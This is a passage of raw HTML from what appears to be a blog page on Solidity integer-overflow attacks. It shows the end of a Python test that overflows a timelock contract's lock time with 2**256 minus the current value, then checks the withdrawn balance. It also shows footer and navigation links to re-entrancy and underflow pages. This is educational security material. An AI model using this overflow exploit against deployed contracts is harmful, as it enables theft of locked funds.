style="color:rgb(137, 221, 255)">=</span><span class="token plain"> time_lock</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">increaseLockTime</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            </span><span class="token builtin" style="color:rgb(130, 170, 255)">pow</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">2</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">256</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(137, 221, 255)">-</span><span class="token plain"> time_lock</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">lockTimeOf</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">get_user_account</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">address</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token string" style="color:rgb(195, 232, 141)">&quot;from&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> get_user_account</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        </span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        increase_tx</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">wait</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">1</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token keyword" style="font-style:italic">assert</span><span class="token plain"> get_user_account</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">balance</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(137, 221, 255)">/</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">10</span><span class="token operator" style="color:rgb(137, 221, 255)">**</span><span class="token number" style="color:rgb(247, 140, 108)">18</span><span class="token plain"> </span><span class="token operator" style="color:rgb(137, 221, 255)">==</span><span class="token plain"> user_balance</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p><strong>Thank you for reading and good luck with building secure blockchain!</strong></p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-tags-row row margin-bottom--sm"><div class="col"><b>Tags:</b><ul class="tags_XVD_ padding--none margin-left--sm"><li class="tag_JSN8"><a class="tag_hD8n tagRegular_D6E_" href="/docs/tags/overflow">overflow</a></li><li class="tag_JSN8"><a class="tag_hD8n tagRegular_D6E_" href="/docs/tags/solidity">solidity</a></li><li class="tag_JSN8"><a class="tag_hD8n tagRegular_D6E_" href="/docs/tags/attack">attack</a></li></ul></div></div><div class="theme-doc-footer-edit-meta-row row"><div class="col"><a href="https://github.com/kkateq/blog/docs/solidity-hacks/overflow.md" target="_blank" rel="noreferrer noopener" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_dcUD" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_foO9"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages navigation"><div class="pagination-nav__item"><a class="pagination-nav__link" href="/docs/solidity-hacks/re-entrancy"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Re-entrancy</div></a></div><div class="pagination-nav__item pagination-nav__item--next"><a class="pagination-nav__link" href="/docs/solidity-hacks/underflow"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Underflow</div></a></div></nav></div></div><div class="col col--3"><div class="tableOfContents_cNA8 thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#description" class="table-of-contents__link toc-highlight">Description</a></li><li><a href="#how-to-test" class="table-of-contents__link toc-highlight">How to test</a></li><li><a href="#how-to-fix" class="table-of-contents__link toc-highlight">How to fix</a></li><li><a href="#demo" class="table-of-contents__link toc-highlight">Demo</a></li></ul></div></div></div></div></main></div></div><footer class="footer"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright Â© 2022 buildany. Built with Docusaurus.</div></div></div></footer></div>
<script src="/assets/js/runtime~main.afe69008.js"></script>
<script src="/assets/js/main.60961d6a.js"></script>
</body>
</html>